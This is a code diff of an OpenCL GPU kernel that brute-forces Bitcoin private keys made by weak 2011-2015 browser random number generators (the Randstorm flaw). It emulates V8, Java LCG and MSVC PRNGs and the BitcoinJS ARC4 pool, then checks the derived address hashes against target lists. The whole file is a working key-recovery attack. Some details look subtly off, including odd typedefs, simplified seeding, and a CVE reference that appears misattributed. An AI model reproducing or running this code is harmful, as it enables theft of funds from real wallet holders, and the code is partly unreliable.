@@ -1,264 +1,225 @@
 // Randstorm/BitcoinJS Vulnerability Scanner - GPU Kernel
 // 
 // This kernel reconstructs vulnerable Bitcoin wallets generated using browser
-// JavaScript from 2011-2015. Implements Chrome V8 MWC1616 PRNG and direct
-// private key derivation (pre-BIP32).
+// JavaScript from 2011-2015. Implements multiple PRNG engines:
+// - Chrome V8 MWC1616
+// - Firefox/IE Java LCG
+// - Safari Windows MSVC CRT
 //
-// Phase 1 Target: 60-70% vulnerability coverage with 10x GPU speedup
+// Phase 2/3 Target: 85-95%+ vulnerability coverage
 //
 // References:
 // - CVE-2018-6798: Chrome V8 PRNG vulnerability
 // - Randstorm disclosure: https://www.unciphered.com/randstorm
 
-// Include necessary cryptographic primitives
-// These are from the existing kernel library
 typedef unsigned char uchar;
-typedef unsigned int uint;
-typedef unsigned long ulong;
+typedef uint uint;
+typedef ulong ulong;
 
-// MWC1616 PRNG State (Chrome V8 algorithm from 2011-2015)
-typedef struct {
-    uint s1;
-    uint s2;
-} mwc1616_state;
+#define ENGINE_V8_MWC1616 0
+#define ENGINE_JAVA_LCG   1
+#define ENGINE_MSVC_CRT   2
+
+// PRNG State Union to support different algorithms
+typedef union {
+    struct {
+        uint s1;
+        uint s2;
+    } mwc1616;
+    ulong lcg_state;
+} prng_state;
 
 // Browser fingerprint configuration
 typedef struct {
-    ulong timestamp_ms;      // Unix timestamp in milliseconds
-    uint screen_width;       // Screen resolution width
-    uint screen_height;      // Screen resolution height
-    uchar color_depth;       // Color depth (typically 24 or 32)
-    short timezone_offset;   // Timezone offset in minutes
-    uchar user_agent_hash[32]; // SHA-256 hash of user agent string (pre-computed)
-    uchar language_hash[32];   // SHA-256 hash of language (pre-computed)
-    uchar platform_hash[32];   // SHA-256 hash of platform (pre-computed)
+    ulong timestamp_ms;
+    uint screen_width;
+    uint screen_height;
+    uchar color_depth;
+    short timezone_offset;
+    uchar user_agent_hash[32];
+    uchar language_hash[32];
+    uchar platform_hash[32];
 } browser_fingerprint;
 
 // ============================================================================
-// MWC1616 PRNG Implementation (Chrome V8)
+// PRNG Implementations
 // ============================================================================
 
-// Initialize MWC1616 state from seed components
-// This mimics how Chrome V8 seeded Math.random() from browser fingerprint
-inline mwc1616_state mwc1616_init(
-    ulong timestamp,
-    __global const uchar *fingerprint_hash
-) {
-    mwc1616_state state;
-    
-    // Combine timestamp with fingerprint hash to create seed
-    // XOR timestamp with first 8 bytes of fingerprint hash
-    ulong hash_u64 = ((ulong)fingerprint_hash[0] << 0) |
-                     ((ulong)fingerprint_hash[1] << 8) |
-                     ((ulong)fingerprint_hash[2] << 16) |
-                     ((ulong)fingerprint_hash[3] << 24) |
-                     ((ulong)fingerprint_hash[4] << 32) |
-                     ((ulong)fingerprint_hash[5] << 40) |
-                     ((ulong)fingerprint_hash[6] << 48) |
-                     ((ulong)fingerprint_hash[7] << 56);
-    
-    ulong seed = timestamp ^ hash_u64;
-    
-    // Split seed into two 32-bit values for MWC1616
-    state.s1 = (uint)(seed >> 32);
-    state.s2 = (uint)(seed & 0xFFFFFFFF);
-    
-    // Ensure non-zero state (required for MWC)
-    if (state.s1 == 0) state.s1 = 1;
-    if (state.s2 == 0) state.s2 = 1;
-    
-    return state;
+// --- V8 MWC1616 ---
+inline void v8_mwc1616_init(prng_state *state, ulong seed) {
+    state->mwc1616.s1 = (uint)(seed >> 32);
+    state->mwc1616.s2 = (uint)(seed & 0xFFFFFFFF);
+    if (state->mwc1616.s1 == 0) state->mwc1616.s1 = 1;
+    if (state->mwc1616.s2 == 0) state->mwc1616.s2 = 1;
 }
 
-// Generate next 32-bit random value using MWC1616
-// This is the exact algorithm used by Chrome V8 versions 14-45
-inline uint mwc1616_next(mwc1616_state *state) {
-    // MWC1616 algorithm
-    state->s1 = 18000 * (state->s1 & 0xFFFF) + (state->s1 >> 16);
-    state->s2 = 30903 * (state->s2 & 0xFFFF) + (state->s2 >> 16);
-    
-    return (state->s1 << 16) + state->s2;
+inline uint v8_mwc1616_next(prng_state *state) {
+    state->mwc1616.s1 = 18000 * (state->mwc1616.s1 & 0xFFFF) + (state->mwc1616.s1 >> 16);
+    state->mwc1616.s2 = 30903 * (state->mwc1616.s2 & 0xFFFF) + (state->mwc1616.s2 >> 16);
+    return (state->mwc1616.s1 << 16) + state->mwc1616.s2;
 }
 
-// Fill buffer with random bytes from MWC1616
-inline void mwc1616_fill_bytes(mwc1616_state *state, uchar *buffer, uint count) {
-    for (uint i = 0; i < count; i += 4) {
-        uint value = mwc1616_next(state);
-        
-        // Store bytes in little-endian order
-        buffer[i + 0] = (uchar)(value & 0xFF);
-        if (i + 1 < count) buffer[i + 1] = (uchar)((value >> 8) & 0xFF);
-        if (i + 2 < count) buffer[i + 2] = (uchar)((value >> 16) & 0xFF);
-        if (i + 3 < count) buffer[i + 3] = (uchar)((value >> 24) & 0xFF);
+// --- Java LCG (Firefox/IE) ---
+inline void java_lcg_init(prng_state *state, ulong seed) {
+    state->lcg_state = (seed ^ 0x5DEECE66DL) & ((1L << 48) - 1);
+}
+
+inline uint java_lcg_next_u16(prng_state *state) {
+    // BitcoinJS Java LCG next_u16: (seed >> 32)
+    state->lcg_state = (state->lcg_state * 0x5DEECE66DL + 0xBL) & ((1L << 48) - 1);
+    return (uint)(state->lcg_state >> 32);
+}
+
+// --- MSVC CRT (Safari Windows) ---
+inline void msvc_crt_init(prng_state *state, ulong seed) {
+    state->lcg_state = seed & 0xFFFFFFFFL;
+}
+
+inline uint msvc_crt_next_u16(prng_state *state) {
+    state->lcg_state = (state->lcg_state * 214013L + 2531011L) & 0xFFFFFFFFL;
+    return (uint)((state->lcg_state >> 16) & 0xFFFF);
+}
+
+// Unified next_u16 function
+inline uint prng_next_u16(prng_state *state, uint engine_type) {
+    if (engine_type == ENGINE_V8_MWC1616) {
+        return v8_mwc1616_next(state) >> 16;
+    } else if (engine_type == ENGINE_JAVA_LCG) {
+        return java_lcg_next_u16(state);
+    } else {
+        return msvc_crt_next_u16(state);
     }
 }
 
 // ============================================================================
-// Bitcoin Address Derivation (Pre-BIP32 Direct Key)
+// ARC4 Implementation
 // ============================================================================
 
-// Forward declarations for crypto functions from existing kernels
-void sha256_hash(__global const uchar *input, uint len, uchar *output);
-void ripemd160_hash(__global const uchar *input, uint len, uchar *output);
-void secp256k1_derive_pubkey(const uchar *privkey, uchar *pubkey);
-void base58check_encode(const uchar *data, uint len, uchar *output);
+typedef struct {
+    uchar i;
+    uchar j;
+    uchar s[256];
+} arc4_state;
 
-// Derive Bitcoin P2PKH address from private key bytes
-// This is how BitcoinJS and early wallet libraries generated addresses
-inline void derive_p2pkh_address(
-    const uchar *privkey_bytes,
-    uchar *address_output
+inline void arc4_init(arc4_state *state, __private const uchar *key, uint key_len) {
+    for (int i = 0; i < 256; i++) {
+        state->s[i] = (uchar)i;
+    }
+    state->i = 0;
+    state->j = 0;
+
+    uchar j = 0;
+    for (int i = 0; i < 256; i++) {
+        j = j + state->s[i] + key[i % key_len];
+        uchar tmp = state->s[i];
+        state->s[i] = state->s[j];
+        state->s[j] = tmp;
+    }
+}
+
+inline uchar arc4_next(arc4_state *state) {
+    state->i = state->i + 1;
+    state->j = state->j + state->s[state->i];
+    uchar tmp = state->s[state->i];
+    state->s[state->i] = state->s[state->j];
+    state->s[state->j] = tmp;
+    return state->s[(uchar)(state->s[state->i] + state->s[state->j])];
+}
+
+// ============================================================================
+// Bitcoin Address Derivation
+// ============================================================================
+
+// External crypto functions (MUST be present in the final binary via linking or inclusion)
+extern void sha256_hash_private(__private const uchar *input, uint len, __private uchar *output);
+extern void ripemd160_hash_private(__private const uchar *input, uint len, __private uchar *output);
+extern void secp256k1_derive_pubkey_private(__private const uchar *privkey, __private uchar *pubkey);
+
+inline void derive_p2pkh_hash(
+    __private const uchar *privkey_bytes,
+    __private uchar *hash_output
 ) {
-    uchar pubkey[65];  // Uncompressed public key (1 + 32 + 32 bytes)
-    uchar pubkey_hash[20];  // RIPEMD160(SHA256(pubkey))
-    uchar versioned_hash[21];  // 0x00 + pubkey_hash
+    uchar pubkey[65];
+    secp256k1_derive_pubkey_private(privkey_bytes, pubkey);
     
-    // Step 1: Derive public key from private key using secp256k1
-    secp256k1_derive_pubkey(privkey_bytes, pubkey);
-    
-    // Step 2: SHA-256 hash of public key
     uchar sha256_result[32];
-    sha256_hash(pubkey, 65, sha256_result);
+    sha256_hash_private(pubkey, 65, sha256_result);
     
-    // Step 3: RIPEMD-160 hash of SHA-256 result
-    ripemd160_hash(sha256_result, 32, pubkey_hash);
-    
-    // Step 4: Add version byte (0x00 for mainnet P2PKH)
-    versioned_hash[0] = 0x00;
-    for (int i = 0; i < 20; i++) {
-        versioned_hash[i + 1] = pubkey_hash[i];
-    }
-    
-    // Step 5: Base58Check encode to create address
-    base58check_encode(versioned_hash, 21, address_output);
+    ripemd160_hash_private(sha256_result, 32, hash_output);
 }
 
 // ============================================================================
-// Main Kernel: Randstorm Scanner
+// Main Kernel: Randstorm Check
 // ============================================================================
 
-__kernel void randstorm_scan(
-    __global const browser_fingerprint *fingerprints,  // Browser configs to test
-    __global const ulong *timestamp_range_start,       // Timestamp range start (ms)
-    __global const ulong *timestamp_range_end,         // Timestamp range end (ms)
-    __global const uint *timestamp_step,               // Timestamp increment (ms)
-    __global const uchar *target_address_hash,         // SHA-256 hash of target address
-    __global uchar *match_found,                       // Output: 1 if match found
-    __global ulong *match_timestamp,                   // Output: Matching timestamp
-    __global uint *match_config_id                     // Output: Matching config ID
+__kernel void randstorm_check(
+    __global const ulong *fingerprints_raw, // [timestamp, width, height, ...]
+    const uint batch_size,
+    __global const uchar *target_hashes,    // 20-byte hashes
+    const uint num_targets,
+    const uint engine_type,
+    __global uint *output_matches
 ) {
-    const ulong global_id = get_global_id(0);
-    const uint config_id = global_id / ((timestamp_range_end[0] - timestamp_range_start[0]) / timestamp_step[0]);
-    const ulong timestamp_offset = global_id % ((timestamp_range_end[0] - timestamp_range_start[0]) / timestamp_step[0]);
+    const uint idx = get_global_id(0);
+    if (idx >= batch_size) return;
+
+    ulong timestamp = fingerprints_raw[idx * 3];
     
-    // Early exit if we've already found a match (optimization)
-    if (match_found[0] == 1) {
-        return;
+    // 1. Initialize PRNG (Math.random)
+    prng_state p_state;
+    if (engine_type == ENGINE_V8_MWC1616) {
+        v8_mwc1616_init(&p_state, timestamp);
+    } else if (engine_type == ENGINE_JAVA_LCG) {
+        java_lcg_init(&p_state, timestamp);
+    } else {
+        msvc_crt_init(&p_state, timestamp);
     }
     
-    // Calculate timestamp for this thread
-    ulong timestamp = timestamp_range_start[0] + (timestamp_offset * timestamp_step[0]);
-    
-    // Get browser configuration
-    browser_fingerprint config = fingerprints[config_id];
-    
-    // Combine fingerprint components into single hash
-    uchar fingerprint_hash[32];
-    for (int i = 0; i < 32; i++) {
-        fingerprint_hash[i] = config.user_agent_hash[i] ^ 
-                             config.language_hash[i] ^ 
-                             config.platform_hash[i];
+    // 2. Fill Entropy Pool (256 bytes) - BitcoinJS v0.1.3 style
+    uchar pool[256];
+    for (int i = 0; i < 256; i += 2) {
+        uint val = prng_next_u16(&p_state, engine_type);
+        pool[i] = (uchar)(val >> 8); // high byte
+        if (i + 1 < 256) pool[i + 1] = (uchar)(val & 0xFF); // low byte
     }
     
-    // Initialize MWC1616 PRNG with timestamp + fingerprint
-    mwc1616_state prng = mwc1616_init(timestamp, fingerprint_hash);
+    // 3. XOR with timestamp
+    uint ts32 = (uint)(timestamp & 0xFFFFFFFF);
+    pool[0] ^= (uchar)(ts32 & 0xFF);
+    pool[1] ^= (uchar)((ts32 >> 8) & 0xFF);
+    pool[2] ^= (uchar)((ts32 >> 16) & 0xFF);
+    pool[3] ^= (uchar)((ts32 >> 24) & 0xFF);
     
-    // Generate 32 bytes of random data (private key)
+    // 4. Initialize ARC4
+    arc4_state a_state;
+    arc4_init(&a_state, pool, 256);
+    
+    // 5. Generate Private Key (32 bytes)
     uchar privkey[32];
-    mwc1616_fill_bytes(&prng, privkey, 32);
-    
-    // Ensure private key is in valid secp256k1 range
-    // (This is a simplified check - full validation would be more complex)
-    // Valid range is [1, n-1] where n is secp256k1 order
-    // For speed, we just check it's not all zeros
-    bool is_zero = true;
     for (int i = 0; i < 32; i++) {
-        if (privkey[i] != 0) {
-            is_zero = false;
-            break;
+        privkey[i] = arc4_next(&a_state);
+    }
+    
+    // 6. Derive address hash (RIPEMD160)
+    uchar derived_hash[20];
+    derive_p2pkh_hash(privkey, derived_hash);
+    
+    // 7. Compare with targets
+    uint match = 0;
+    for (uint i = 0; i < num_targets; i++) {
+        bool found = true;
+        __global const uchar *target = &target_hashes[i * 20];
+        for (int j = 0; j < 20; j++) {
+            if (derived_hash[j] != target[j]) {
+                found = false;
+                break;
+            }
         }
-    }
-    if (is_zero) {
-        return;  // Skip invalid key
-    }
-    
-    // Derive Bitcoin address from private key
-    uchar address[35];  // P2PKH address (max 35 chars)
-    derive_p2pkh_address(privkey, address);
-    
-    // Hash the derived address for comparison
-    uchar address_hash[32];
-    sha256_hash(address, 35, address_hash);
-    
-    // Compare with target address hash
-    bool matches = true;
-    for (int i = 0; i < 32; i++) {
-        if (address_hash[i] != target_address_hash[i]) {
-            matches = false;
+        if (found) {
+            match = i + 1;
             break;
         }
     }
     
-    // If we found a match, record it
-    if (matches) {
-        match_found[0] = 1;
-        match_timestamp[0] = timestamp;
-        match_config_id[0] = config_id;
-    }
-}
-
-// ============================================================================
-// Batch Processing Kernel (Optimized for throughput)
-// ============================================================================
-
-// This kernel generates addresses in batches without checking for matches
-// Used for building bloom filters or rainbow tables of vulnerable addresses
-__kernel void randstorm_batch_generate(
-    __global const browser_fingerprint *fingerprints,
-    __global const ulong *timestamps,
-    __global uchar *output_addresses,  // Output: 35 bytes per address
-    const uint batch_size
-) {
-    const ulong global_id = get_global_id(0);
-    
-    if (global_id >= batch_size) {
-        return;
-    }
-    
-    // Get browser configuration and timestamp for this thread
-    uint config_id = global_id / batch_size;
-    browser_fingerprint config = fingerprints[config_id];
-    ulong timestamp = timestamps[global_id];
-    
-    // Combine fingerprint components
-    uchar fingerprint_hash[32];
-    for (int i = 0; i < 32; i++) {
-        fingerprint_hash[i] = config.user_agent_hash[i] ^ 
-                             config.language_hash[i] ^ 
-                             config.platform_hash[i];
-    }
-    
-    // Initialize PRNG and generate private key
-    mwc1616_state prng = mwc1616_init(timestamp, fingerprint_hash);
-    uchar privkey[32];
-    mwc1616_fill_bytes(&prng, privkey, 32);
-    
-    // Derive address
-    uchar address[35];
-    derive_p2pkh_address(privkey, address);
-    
-    // Write to output buffer
-    for (int i = 0; i < 35; i++) {
-        output_addresses[global_id * 35 + i] = address[i];
-    }
+    output_matches[idx] = match;
 }
